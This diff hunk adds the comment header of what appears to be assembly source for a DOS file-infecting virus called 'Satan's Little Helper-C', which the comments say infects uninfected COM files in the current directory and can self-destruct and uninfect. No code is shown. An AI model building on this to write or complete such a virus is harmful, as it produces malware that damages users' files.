@@ -1,0 +1,7 @@
+;			Virus
+;		Satan's Little Helper-C
+;This version:
+;Searches current directory for non-infected com files, if any found
+;it will become infected!
+;This virus has a routine which self-destructs itself and uninfects
+;the file.
